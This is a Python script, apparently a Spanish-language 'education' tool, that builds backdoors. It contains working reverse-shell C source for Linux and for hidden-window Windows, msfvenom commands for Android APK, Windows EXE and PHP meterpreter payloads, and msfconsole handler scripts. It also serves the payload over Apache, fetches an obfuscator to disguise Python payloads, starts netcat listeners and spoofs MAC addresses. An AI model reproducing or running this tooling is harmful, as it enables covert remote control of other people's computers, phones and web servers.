import sys
import os
import sys
import urllib
import subprocess
import socket
if sys.version_info > (3, 0):
    raw_input = input


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])


# Follow me :
# â€¢YouTube: https://youtube.com/3xploit
# â€¢GitHub: https://github.com/3xploit666


def main():
    print("""


   __    _  _  ____  ____  _____  __  __  ____  ____    __       
  /__\  ( \( )(  _ \(  _ \(  _  )(  \/  )( ___)(  _ \  /__\      
 /(__)\  )  (  )(_) ))   / )(_)(  )    (  )__)  )(_) )/(__)\     
(__)(__)(_)\_)(____/(_)\_)(_____)(_/\/\_)(____)(____/(__)(__)    

# Follow me :
# â€¢YouTube: https://youtube.com/3xploit
# â€¢GitHub: https://github.com/3xploit666

                3xploit education Simple tool



1. BackDoors shell 
2. BackDoor APK Simple
3. Listener
4. msfvenom shell windows
5. nxcript
6. php backdoor
7. Generador de Mac 
8. exit 


""")

    global option
    option = raw_input('selecciona tu opcion$#: ')

    if option:
        if option == '1':
            backdoor_generator()

        if option == '2':
            backdoor_apk()

        if option == '4':
            windows()

        elif option == '3':
            banner()
            listener()
        elif option == '5':
            pyenc()

        elif option == '6':
            web_back()

        elif option == '7':
            Generator_mac()



        else:
            sys.exit();

def backdoor_generator():
    print("""


         .__            .___                           .__           .__  .__   
 __  _  _|__| ____    __| _/______  _  ________   _____|  |__   ____ |  | |  |  
 \ \/ \/ /  |/    \  / __ |/  _ \ \/ \/ /  ___/  /  ___/  |  \_/ __ \|  | |  |  
  \     /|  |   |  \/ /_/ (  <_> )     /\___ \   \___ \|   Y  \  ___/|  |_|  |__
   \/\_/ |__|___|  /\____ |\____/ \/\_//____  > /____  >___|  /\___  >____/____/
                 \/      \/                 \/       \/     \/     \/           


                    ~ windows shell ~ 
                    
 1. Linux Backdoor shell 
 2. Windows  Backdoor shell 
 3. listener
 

 """)

    select = raw_input("selecciona tu opcion$#: ")

    if (select == '1'):
        print("""
      

 __    ____  _  _  __  __  _  _    ____    __    ___  _  _  ____  _____  _____  ____ 
(  )  (_  _)( \( )(  )(  )( \/ )  (  _ \  /__\  / __)( )/ )(  _ \(  _  )(  _  )(  _ \
 )(__  _)(_  )  (  )(__)(  )  (    ) _ < /(__)\( (__  )  (  )(_) ))(_)(  )(_)(  )   /
(____)(____)(_)\_)(______)(_/\_)  (____/(__)(__)\___)(_)\_)(____/(_____)(_____)(_)\_)





                             ~ Linux shell reverse ~
 """)
        host = raw_input("[?] Enter your IP (LHOST): ")
        port = raw_input("[?] Enter your port (LPORT): ")
        linux_shell(host, port)
        os.system("gcc .shell.c -o backdoor -pthread && rm -rf .shell.c")
        print("[*] Backdoor Generado...[*]")
        clear()
        print("[1] Start a listenner")
        print("Select 1 para empezar la escucha")
        li = input()
        if li == '1':
           listener()



    if (select == '2'):
        print("""
 â–ˆ

 _    _    ____    __    ___  _  _  ____  _____  _____  ____ 
( \/\/ )  (  _ \  /__\  / __)( )/ )(  _ \(  _  )(  _  )(  _ \
 )    (    ) _ < /(__)\( (__  )  (  )(_) ))(_)(  )(_)(  )   /
(__/\__)  (____/(__)(__)\___)(_)\_)(____/(_____)(_____)(_)\_)


                ~ Windows Reverse Shell~

 """)

        host = raw_input("[?] Enter your IP (LHOST): ")
        port = raw_input("[?] Enter your port (LPORT):")
        windows_reverse(host, port)
        os.system("/usr/bin/i686-w64-mingw32-gcc winshell.c -o backdoor.exe -lws2_32 && rm -rf winshell.c")
        print("[*] Backdoor Generado.....[*]")
        clear()
        print("Payload Successfuly Generated")
        print("[1] Start a listenner")
        li = input()
        if li == '1':
           listener()


def backdoor_apk():
    print("""



 ____    __    ___  _  _  ____  _____  _____  ____      __    ____  _  _ 
(  _ \  /__\  / __)( )/ )(  _ \(  _  )(  _  )(  _ \    /__\  (  _ \( )/ )
 ) _ < /(__)\( (__  )  (  )(_) ))(_)(  )(_)(  )   /   /(__)\  )___/ )  ( 
(____/(__)(__)\___)(_)\_)(____/(_____)(_____)(_)\_)  (__)(__)(__)  (_)\_)



                          ~ backdoor apk ~ 
 1. backdoor apk

 """)

    select = raw_input("selecciona tu opcion$#: ")

    if (select == '1'):
        print("""
                   ~ simple apk~
 """)

        HH = raw_input("[?] Enter your IP (LHOST): ")
        PP = raw_input("[?] Enter your port (LPORT): ")
        EE = raw_input("[?] Nombre del apk: ")
        if not os.path.isdir("./resultados"):
            os.makedirs("./resultados")
            print("[+] creando directorio resultados [+]")
        os.system(
            'msfvenom -p android/meterpreter/reverse_tcp LHOST=' + HH + ' LPORT=' + PP + ' R > ./resultados/' + EE + '.apk')

        print("[*] Apk  Generada...[*]")
        os.system("service postgresql start")
        listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(HH, PP)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


def windows():
    lhost = raw_input("Enter LHOST: ")
    lport = raw_input("Enter LPORT: ")
    name = raw_input("Enter Payload Name: ")
    os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe" % (lhost, lport, name))
    clear()
    print("Payload Successfuly Generated")
    print("[1] Start a listenner")
    print("[2] Apache2 start  ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.exe /var/www/html' % (name))
        print("Backdoor complete servidor : %s/%s.exe" % (lhost, name))
        listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')



def linux_shell(host, port):
    print("[*] Starting Process.. [*]")
    with open(".shell.c", "w") as file:
        file.write('''
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>

 int main (int argc, char **argv)
 {
   int scktd;
   struct sockaddr_in client;

   client.sin_family = AF_INET;
   client.sin_addr.s_addr = inet_addr("%s");
   client.sin_port = htons(%s);
   scktd = socket(AF_INET,SOCK_STREAM,0);
   connect(scktd,(struct sockaddr *)&client,sizeof(client));
   dup2(scktd,0); // STDIN
   dup2(scktd,1); // STDOUT
   dup2(scktd,2); // STDERR
   execl("/bin/sh","sh","-i",NULL,NULL);
   return 0;
 }
 ''' % (host, port))


def windows_reverse(host, port):
    with open("winshell.c", "w") as file:
        file.write('''
 #include <winsock2.h>
 #include <stdio.h>
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib,"ws2_32")
   WSADATA wsaData;
   SOCKET Winsock;
   SOCKET Sock;
   struct sockaddr_in hax;
   char ip_addr[16];
   STARTUPINFO ini_processo;
   PROCESS_INFORMATION processo_info;
 //int main(int argc, char *argv[])
 int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
 {
     FreeConsole();
     WSAStartup(MAKEWORD(2,2), &wsaData);
     Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

     struct hostent *host;
     host = gethostbyname("''' + host + '''");
     strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
     hax.sin_family = AF_INET;
     hax.sin_port = htons(atoi("''' + port + '''"));
     hax.sin_addr.s_addr = inet_addr(ip_addr);
     WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
     memset(&ini_processo,0,sizeof(ini_processo));
     ini_processo.cb=sizeof(ini_processo);
     ini_processo.dwFlags=STARTF_USESTDHANDLES;
     ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
     CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
 }
 ''')





























def pyenc():
        check = raw_input("Is It Your First Time ? (y/N) :")
        pypayload = raw_input("Enter Your Python Payload Name (ex.py) : ")
        pyoutput = raw_input("Enter The Output Name of Your Payload : ")
        if check in no:
            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))
        else:
            os.system("git clone https://github.com/Hadi999/NXcrypt.git")
            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))


def web_back():
    print (""" 
           --------------------------
                   php Backdoor
           --------------------------
""")

    HHH = raw_input("[?] Enter your IP (LHOST): ")
    PPP = raw_input("[?] Enter your port (LPORT): ")
    EEE = raw_input("[?] Nombre del shell : ")
    if not os.path.isdir("./resultados"):
     os.makedirs("./resultados")
    print("[+] creando directorio resultados [+]")
    os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST=' + HHH + ' LPORT=' + PPP + ' -f raw R > ./resultados/' + EEE + '.php')
    print("[*] Backdoor php  Generado...[*]")
    os.system("service postgresql start")
    listen = """
	use exploit/multi/handler
	set PAYLOAD php/meterpreter/reverse_tcp
	set LHOST {0}
	set LPORT {1}
    exploit
	""".format(HHH, PPP)
    with open('listener.rc', 'w') as f:
       f.write(listen)
    os.system('msfconsole -r listener.rc')

def Generator_mac():
    print (""" 
           --------------------------
            GENERADOR DE MAC 3XPLOIT
           --------------------------
""")

    interface = input("interface > ")
    new_mac = input("new Mac > ")
    print("[+] Cambiando Mac "  + interface + " A " + new_mac)
    subprocess.call("ifconfig " + interface + " down", shell=True)
    subprocess.call("ifconfig " + interface + " hw ether " + new_mac, shell=True)
    subprocess.call("ifconfig " + interface + " up", shell=True)





def banner():
    print("""


  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$ 
 | $$      |_  $$_/ /$$__  $$|__  $$__/| $$_____/| $$$ | $$| $$_____/| $$__  $$
 | $$        | $$  | $$  \__/   | $$   | $$      | $$$$| $$| $$      | $$  \ $$
 | $$        | $$  |  $$$$$$    | $$   | $$$$$   | $$ $$ $$| $$$$$   | $$$$$$$/
 | $$        | $$   \____  $$   | $$   | $$__/   | $$  $$$$| $$__/   | $$__  $$
 | $$        | $$   /$$  \ $$   | $$   | $$      | $$\  $$$| $$      | $$  \ $$
 | $$$$$$$$ /$$$$$$|  $$$$$$/   | $$   | $$$$$$$$| $$ \  $$| $$$$$$$$| $$  | $$
 |________/|______/ \______/    |__/   |________/|__/  \__/|________/|__/  |__/


                            #listener shell#


 """)

#listener simple nc 
def listener():
    try:
        port = int(raw_input("Ingresa tu puerto a Escucha:"))
        os.system("nc -lvp %s" % port)

    except:
        print("el oyente no pudo ser iniciado")


if __name__ == '__main__':
    main()
